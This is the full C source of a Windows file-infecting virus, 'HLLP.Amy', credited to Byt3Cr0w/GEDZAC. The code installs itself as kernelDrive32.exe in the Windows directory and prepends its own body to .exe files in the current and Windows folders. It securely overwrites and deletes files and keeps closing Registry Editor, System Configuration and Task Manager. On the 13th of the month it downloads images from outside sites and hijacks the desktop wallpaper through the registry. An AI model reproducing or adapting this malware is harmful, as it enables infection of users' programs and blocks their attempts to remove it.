   char AMY[] = "HLLP.Amy by Byt3Cr0w/GEDZAC - Thnx to Amy Lee from Evanescence for inspired me in sad-bad moments...";
   #include <windows.h>
   #include <stdio.h>
   DWORD ID,MSize;
   HANDLE thread1,thread2,thread3,thread4,thread5;
   HANDLE ThReAd;
   short c0unt=0;
   short c0unt_=0;
   char MyBuf[1024];
   char *VxDfile;
   char *SeekTarget;
   char *MyPath;
   char *FileEnc;
   char MeatBuf[1024];
   char *FileToDelete;
   FILE *VxD;
   FILE *Meat;
   FILE *Amy;
   char tmpfol[MAX_PATH];
   char actual[MAX_PATH];
   char windirx[MAX_PATH];
   LPSTR MContent;
   typedef long (WINAPI * Func)(long,LPCTSTR,LPCTSTR,DWORD,long);
   int AmySize = 48573;
   char *AmyName;
   LPSTR Arg;

   DWORD WINAPI MzG(void*param)
   {
           MessageBox(0,"[-You H4z Been !nfect3d by HLLP.Amy.A-]","...::-Amy.A by Byt3Cr0w/GEDZAC-::...",32);
           return true;
   }


   int DameSize(char file[])
   {
   FILE *meat;
   int count;
   int bytes = 0;
   meat = fopen(file,"rb");
   if (meat)
   { while(( count = getc(meat)) != EOF)
     {bytes++;}
   fclose(meat);
   }
   return bytes;
   }


   DWORD WINAPI NATO(void*param)
   {
      char temp[MAX_PATH] = "";
      char* target = new char[MAX_PATH];
      strcat(temp,FileToDelete);
      lstrcpy(target,temp);
   FILE *TargetFile;
   int z,x,Data;
   int Size;
    Data = 0x00;
    for(x=0;x<7;x++)
    {
    if (x==7) { Data = 0xff; }
    Size = DameSize(target);
    TargetFile = fopen(target, "wb");
     if (TargetFile) {
               for(z=0;z<Size;z++)
               {
               putc(Data,TargetFile);
               }
   fclose(TargetFile);
   }
   }
   DeleteFile(target);
   return true;
   }

   void Delete_(char target[],int wait)
   {
           FileToDelete = target;
           ThReAd = CreateThread(0,0,NATO,0,0,&ID);
       SetThreadPriority(ThReAd,THREAD_PRIORITY_TIME_CRITICAL);
           if (wait==1)
           { WaitForSingleObject(ThReAd,INFINITE);
             CloseHandle(ThReAd);
             }
           }



   int Random(int range)
   {
   return (int)(rand() % range);
   }

   LPSTR RandomStr(int range)
   {
   srand((unsigned int)GetTickCount());
       char temporal[64] = "";
       char ABC[54] = {'Q','W','E','R','T','Y','U','I','O','P','A','S','D','F','G',
                        'H','J','K','L','Z','X','C','V','B','N','M','q','w','e','r',
                        'y','u','i','o','p','a','s','d','f','g','h','j','k','l','z',
                        'x','c','v','b','n','m'};

                             for (int i=0;i<range;i++)
                           { temporal[i] = ABC[Random(54)]; }
                             char* final = new char[64];
                             lstrcpy(final,temporal);
                             return final;
   }

   LPSTR RandomExt(void)
   {
   srand((unsigned int)GetTickCount());
         char* Extx[5] = {".tmp",".vxd",".dat",".dll",".ged"};
         char* final = new char[64];
         int X = Random(5);
         lstrcpy(final,Extx[X]);
         return final;
   }

   LPSTR GenerateName(void)
   {
      char temp[MAX_PATH] = "";
      char* final = new char[MAX_PATH];
      strcat(temp,tmpfol);
      strcat(temp,"\\");
      strcat(temp,RandomStr(Random(30)));
      strcat(temp,RandomExt());
      lstrcpy(final,temp);
           return final;
   }


   void EcDec(char *File,int mode)
   {
   FILE *in,*out;
   char *OutputFile;
   int count,bytes,key,Dec;
   int j = 1;
                     key = GetFileSize(in,0); key = key * 6;
                     OutputFile = GenerateName();
   in = fopen(File, "rb");
   if (in)
   {
    out = fopen(OutputFile, "wb");
     if (out) {

          while(( count = getc(in)) != EOF)
           {
              if (mode==1) //Encrypt
              {
              count = count ^ key;
              count = count + GetFileSize(in,0);
              count = count - j;
              }
              if (mode==2) //Decrypt
              {
              count = count + j;
              count = count - GetFileSize(in,0);
              count = count ^ key;
              }
              if (j==100) { Dec = 1; }
              if (j==1) { Dec = 0; }
              if (Dec==1) { j--; }
              else { j++; }
              putc(count, out);
           }
   fclose(in);
   fclose(out);
   }
   }
   Delete_(File,1);
   MoveFile(OutputFile,File);
   }



   bool fileexists(char meat[])
   {
        HANDLE Handy;
        Handy = CreateFile(meat,
                              GENERIC_READ,
                              FILE_SHARE_READ,
                              NULL,
                              OPEN_EXISTING,
                              FILE_ATTRIBUTE_ARCHIVE,
                              NULL);
   if (NULL == Handy || INVALID_HANDLE_VALUE == Handy)
    { return FALSE; } else {return TRUE;}
   }

   void GetMyCode(void)
   {
           HANDLE Me;
           DWORD rid;

           Me = CreateFile(AmyName,
                   GENERIC_READ,
                   FILE_SHARE_READ,
                   0,
                   OPEN_EXISTING,
                   0,
                   0);

   if (Me!=INVALID_HANDLE_VALUE)
   {
                                   MSize = AmySize;
                                   MContent = (LPSTR)GlobalAlloc(GPTR,MSize+1);
                                   if(MContent!=NULL)

                                   {
                                           ReadFile(
                                           Me,
                                           MContent,
                                           MSize,
                                           &rid,
                                           0);

                                           }
                                            }
                                           CloseHandle(Me);
                                           }



   bool CheCk(char target[])
   {
           HANDLE ToCheck;
           DWORD rid;
           LPSTR Bytez;
           LPSTR Firm;
           int FileStatuz = 0;


           ToCheck = CreateFile(target,
                   GENERIC_READ,
                   FILE_SHARE_READ,
                   0,
                   OPEN_EXISTING,
                   0,
                   0);

   if (ToCheck!=INVALID_HANDLE_VALUE)
   {

                                   SetFilePointer(ToCheck,-3,0,FILE_END);
                                   Firm = (LPSTR)GlobalAlloc(GPTR,0);
                                   if(Firm!=NULL)
                                   {
                                           ReadFile(
                                           ToCheck,
                                           Firm,
                                           3,
                                           &rid,
                                           0);

                                            }

                                           CloseHandle(ToCheck);


                   char fIrm[20];
                   strncpy(fIrm,Firm,3);
                   fIrm[3] = '\0';
                   if (strcmp(fIrm,"Amy")!=0) // Amy = Firma del virus
                   { FileStatuz++; }

                   VirtualFree(Firm,0,MEM_RELEASE);
                   VirtualFree(fIrm,0,MEM_RELEASE);

                   if (FileStatuz==1)
                   { return true; }
                   else { return false; }
                   }
   }



   void ReConstructCell(char freshmeat[],char Org[])
   {
   EcDec(freshmeat,1);
   //Sleep(500);

   HANDLE Victim,Me,VxD;
   DWORD VSize,VxDSize,writ,rid;
   LPSTR VContent;
   LPSTR FirM;

   srand((unsigned int)GetTickCount());
      char temp[MAX_PATH] = "";
      char* RandomName = new char[MAX_PATH];
      strcat(temp,tmpfol);
      strcat(temp,RandomStr(Random(30)));
      strcat(temp,RandomExt());
      strcat(temp,Org);
      lstrcpy(RandomName,temp);

   FirM = "Amy";


   Victim = CreateFile(freshmeat,
                       GENERIC_READ,
                       FILE_SHARE_READ,
                       0,
                       OPEN_EXISTING,
                       0,
                       0);

   if (Victim!=INVALID_HANDLE_VALUE)
   {
                                   VSize = GetFileSize(Victim,
                                                       NULL);
                                   VContent = (LPSTR)GlobalAlloc(GPTR,VSize+1);
                                   if(VContent!=NULL)

                                   {
                                           ReadFile(
                                           Victim,
                                           VContent,
                                           VSize,
                                           &rid,
                                           0);

                                           }


   Again:
   VxDfile = RandomName;
   if (fileexists(VxDfile)) { goto Again; }

   VxD = CreateFile(VxDfile,
                    GENERIC_WRITE,
                    0,
                    0,
                    CREATE_ALWAYS,
                    FILE_ATTRIBUTE_NORMAL,
                    0);

   if (VxD!=INVALID_HANDLE_VALUE)
   {
                                   WriteFile(
                                   VxD,
                                   MContent,
                                   MSize,
                                   &writ,
                                   0);

                                   WriteFile(
                                   VxD,
                                   VContent,
                                   VSize,
                                   &writ,
                                   0);

                                   WriteFile(
                                   VxD,
                                   FirM,
                                   3,
                                   &writ,
                                   0);

                                   }
                                 }
                                   CloseHandle(Victim);
                                   CloseHandle(VxD);
                                   CopyFile(VxDfile,freshmeat,0);
                                   Delete_(VxDfile,0);
                             //      Sleep(3000);
                           }



   DWORD WINAPI Zeek(void*param)
   {

       WIN32_FIND_DATA Data;
       HANDLE Gooooogle;
           char temp_[MAX_PATH] = "";
           char* ToFind = new char[MAX_PATH];
           int Counter=0;

                   strcat(temp_,SeekTarget);
                   strcat(temp_,"*.exe");
                   lstrcpy(ToFind,temp_);
                   Gooooogle=FindFirstFile(ToFind,&Data);
                if (Gooooogle!=INVALID_HANDLE_VALUE)
                   {
                   if (!(Data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
                   {
                   char temp[MAX_PATH] = "";
                   char* target = new char[MAX_PATH];
                   strcat(temp,SeekTarget);
                   strcat(temp,Data.cFileName);
                   lstrcpy(target,temp);
                   if (CheCk(target))

                           {
                           ReConstructCell(target,Data.cFileName);
                           Counter++;
                                  }
                   }
                   while (FindNextFile(Gooooogle,&Data))
                   {
                if (!(Data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
                   {
                   char temp[MAX_PATH] = "";
                   char* target = new char[MAX_PATH];
                   strcat(temp,SeekTarget);
                   strcat(temp,Data.cFileName);
                   lstrcpy(target,temp);
                   if (CheCk(target))
                           {
                           ReConstructCell(target,Data.cFileName);
                           Counter++;
                           if (Counter==100) { goto PAfuera; }
                           }
                   }
      }
     }
                   PAfuera:
                   FindClose(Gooooogle);

   }

   void SeekAndFoundT(char folder[])
   {
   SeekTarget = folder;
   CreateThread(NULL,NULL,Zeek,NULL,NULL,&ID);
   Sleep(20);
   }



   DWORD WINAPI Inf3ct(void*param)
   {

   strcat(windirx,"\\");
   strcat(actual,"\\");
   SeekAndFoundT(actual);
   SeekAndFoundT(windirx);
   return true;
   }


   void MakeHTML(void)
   {
   HKEY hKey;
   char code1[] = "<html>\n<head>\n<title>Amy - by Byt3Cr0w/GEDZAC</title>\n</head>\n<body bgcolor=\"#000000\">\n<p align=\"center\"><font color=\"#FF0000\"><b>...Y0U H4Z B33N 0WN3D...<br>\nBY<br>\n<u>HLLP.Amy</u></b></font></p>\n<p align=\"center\">\n<img border=\"0\" src=\"";
   char code2[] = "file:///C:/amy.jpg\"<br>\n<br>\n<font color=\"#800000\">Byt3Cr0w/GEDZAC <br>\n2005<br>\n<br>\n<a href=\"http://www.gedzac.tk\"><font color=\"#800000\">www.gedzac.tk</font></a><br>\n<a href=\"http://www.byt3cr0w.tk\"><font color=\"#800000\">www.byt3cr0w.tk</font></a></font></p>\n</body>\n</html>";
   char temp[MAX_PATH] = "";
   char* html = new char[MAX_PATH];
   strcat(temp,code1);
   strcat(temp,code2);
   lstrcpy(html,temp);
   HANDLE HTML;
   DWORD writ;
   HTML = CreateFile("C:\\wall.html",
                    GENERIC_WRITE,
                    0,
                    0,
                    CREATE_ALWAYS,
                    FILE_ATTRIBUTE_NORMAL,
                    0);
   if (HTML!=INVALID_HANDLE_VALUE)
   {
                                   WriteFile(
                                   HTML,
                                   html,
                                   500,
                                   &writ,
                                   0);
   RegCreateKey(HKEY_CURRENT_USER,"Control Panel\\Desktop",&hKey);
   RegSetValueEx(hKey,"wallpaper",0,REG_SZ,(LPBYTE)"C:\\wall.html",12);
   RegCreateKey(HKEY_CURRENT_USER,"Software\\Microsoft\\Internet Explorer\\Desktop\\General",&hKey);
   RegSetValueEx(hKey,"BackupWallpaper",0,REG_SZ,(LPBYTE)"C:\\wall.html",12);
   RegCreateKey(HKEY_CURRENT_USER,"Control Panel\\Desktop",&hKey);
   RegSetValueEx(hKey,"ConvertedWallpaper",0,REG_SZ,(LPBYTE)"C:\\wall.html",12);
   }
   CloseHandle(HTML);
   }

   BOOL Check(int c)
   {
        int NormalSize;
        if (c==1) NormalSize = 44809;
        if (c==2) NormalSize = 21924;
        if (c==3) NormalSize = 72184;
        if (c==4) NormalSize = 314334;
        if (c==5) NormalSize = 17184;
        DWORD bytez;
        HANDLE ToCheck;
        ToCheck = CreateFile("C:\\amy.jpg",GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
   if (INVALID_HANDLE_VALUE != ToCheck)
   {
        bytez = GetFileSize(ToCheck,0);
        if (bytez==NormalSize) {return TRUE;} else { return FALSE;}
        }
        }

   int Paydate(void)
   {
                   SYSTEMTIME tiempo;
                   GetSystemTime(&tiempo);
                   if (tiempo.wDay==13)
                   {return 1;} else {return 0;}
                   }


   DWORD WINAPI Im4g3z(void*param)
   {
   long Downloader;
   HMODULE Urlmon;
   Func This;
   Urlmon = LoadLibrary("urlmon.dll");
    if(Urlmon != NULL)
   This = (Func) GetProcAddress(Urlmon, "URLDownloadToFileA");
           Downloader = This(0,"http://www.u-blog.net/fabnb/img/amy-lee.jpg","C:\\amy.jpg",0,0);
           if (Check(1)) {goto ok;}
           Downloader = This(0,"http://songe.canalblog.com/Amy_Lee.jpg","C:\\amy.jpg",0,0);
           if (Check(2)) {goto ok;}
           Downloader = This(0,"http://www.wallforyou.altervista.org/images/amylee.jpg","C:\\amy.jpg",0,0);
           if (Check(3)) {goto ok;}
               Downloader = This(0,"http://www.lo.redjupiter.com/images/courtney/amysolo1.jpg","C:\\amy.jpg",0,0);
               if (Check(4)) {goto ok;}
               Downloader = This(0,"http://www.20six.nl/pub/Ellentjeuh/hanging.jpg","C:\\amy.jpg",0,0);
               if (Check(5)) {goto ok;}
               else { MakeHTML(); }
           ok:
              FreeLibrary(Urlmon);
              MakeHTML;
   }

   void Execute(LPCTSTR target,LPTSTR params)
   {
       STARTUPINFO start;
       PROCESS_INFORMATION info;
       int x;
       ZeroMemory (&start,sizeof(start));
       start.cb = sizeof(start);
       x = CreateProcess(target,params,0,0,true,NORMAL_PRIORITY_CLASS,0,0,&start,&info);
       do { x = WaitForSingleObject(info.hProcess,0);}
       while(x == 258);
       x = CloseHandle(info.hProcess);
       DeleteFile(target);
   }


              DWORD WINAPI SueltaAlHost(void*param)
              {
                   HANDLE Me;
                   HANDLE Future;
                   DWORD rid;
                   DWORD writ;
                   LPSTR MyCode;
                   int MySize;
                   char *FFile;

                   srand((unsigned int)GetTickCount());
                   char temp[MAX_PATH] = "";
                   char* RandomName = new char[MAX_PATH];
                   strcat(temp,tmpfol);
                   strcat(temp,RandomStr(Random(30)));
                   strcat(temp,RandomExt());
                   lstrcpy(RandomName,temp);

                   Me = CreateFile(AmyName,
                                   GENERIC_READ,
                                   FILE_SHARE_READ,
                                   0,
                                   OPEN_EXISTING,
                                   0,
                                   0);
                   if (Me!=INVALID_HANDLE_VALUE)
                   {
                                                SetFilePointer(Me,AmySize,0,FILE_BEGIN);
                                                 MySize = GetFileSize(Me,NULL);
                                                 MySize = MySize - AmySize;
                                   MyCode = (LPSTR)GlobalAlloc(GPTR,MySize+1);
                                   if(MyCode!=NULL)

                                   {
                                           ReadFile(
                                           Me,
                                           MyCode,
                                           MySize,
                                           &rid,
                                           0);

                                           }

   Again:
   FFile = RandomName;
   if (fileexists(FFile)) { goto Again; }

   Future = CreateFile(FFile,
                    GENERIC_WRITE,
                    0,
                    0,
                    CREATE_ALWAYS,
                    FILE_ATTRIBUTE_NORMAL,
                    0);

   if (Future!=INVALID_HANDLE_VALUE)
   {
                                   WriteFile(
                                   Future,
                                   MyCode,
                                   MySize,
                                   &writ,
                                   0);

                                   }

                                   CloseHandle(Me);
                                   CloseHandle(Future);
                                   EcDec(FFile,2);
                                   Execute(FFile,Arg);
                           }
                           }

   DWORD WINAPI Resident(void*param)
   {
   HWND hand;
   char* v1 = "Registry Editor";
   char* v2 = "System Configuration Utility";
   char* v3 = "Editor del Registro";
   char* v4 = "Utilidad de configuración del sistema";
   char* v5 = "Windows Task Manager";
   char* v6 = "Administrador de tareas de Windows";
       close:
       hand = FindWindow(0,v1);
       if (hand!=0) {
                     PostMessage(hand,0x12,0,0);
                    }
       hand = FindWindow(0,v2);
       if (hand!=0) {
                     PostMessage(hand,0x12,0,0);
                    }
       hand = FindWindow(0,v3);
       if (hand!=0) {
                     PostMessage(hand,0x12,0,0);
                    }
       hand = FindWindow(0,v4);
       if (hand!=0) {
                     PostMessage(hand,0x12,0,0);
                    }
       hand = FindWindow(0,v5);
       if (hand!=0) {
                     PostMessage(hand,0x12,0,0);
                    }
       hand = FindWindow(0,v6);
       if (hand!=0) {
                     PostMessage(hand,0x12,0,0);
                    }
       Sleep(1000);
   goto close;
   }



   void Cre4teAllThr3adz(void)
   {
   thread1 = CreateThread(NULL,NULL,Inf3ct,NULL,CREATE_SUSPENDED,&ID);
   thread2 = CreateThread(NULL,NULL,Im4g3z,NULL,CREATE_SUSPENDED,&ID);
   thread3 = CreateThread(NULL,NULL,MzG,NULL,CREATE_SUSPENDED,&ID);
   thread4 = CreateThread(NULL,NULL,SueltaAlHost,NULL,CREATE_SUSPENDED,&ID);
   thread5 = CreateThread(NULL,NULL,Resident,NULL,CREATE_SUSPENDED,&ID);
   }
   void WakeThread(int c)
   {
           if (c==1) { ResumeThread(thread1); }
           if (c==2) { ResumeThread(thread2); }
           if (c==3) { ResumeThread(thread3); }
           if (c==4) { ResumeThread(thread4); }
           if (c==5) { ResumeThread(thread5); }
           }


   int WINAPI WinMain (HINSTANCE hThisInstance,
                       HINSTANCE hPrevInstance,
                       LPSTR lpszArgument,
                       int nFunsterStil)

   {
                        Arg = lpszArgument;
                        char AmYModulE[MAX_PATH];
                        GetModuleFileName(0,AmYModulE,MAX_PATH);
                        GetTempPath(260,tmpfol);
                        GetCurrentDirectory(260,actual);
                        GetWindowsDirectory(windirx,260);
                        AmyName = windirx;
                        strcat(AmyName,"\\kernelDrive32.exe");
                        CopyFile(AmYModulE,AmyName,0);
                        Cre4teAllThr3adz();
                        if (Paydate()==1){
                                        WakeThread(2);
                                        WaitForSingleObject(thread2,INFINITE);
                                        CloseHandle(thread2);
                                        WakeThread(3);
                                        WaitForSingleObject(thread3,INFINITE);
                                        CloseHandle(thread3);
                                        ExitProcess(0);
                                        }
                        WakeThread(4);
                        WaitForSingleObject(thread4,INFINITE);
                        CloseHandle(thread4);
                        HANDLE hMutex=CreateMutex(NULL, FALSE,"Amy");
                        if(GetLastError()==ERROR_ALREADY_EXISTS )
                        { return 0; }
                        GetMyCode();
                        WakeThread(1);
                        WakeThread(5);
                        Sleep(0xffffffff);
                        return 0;


   }
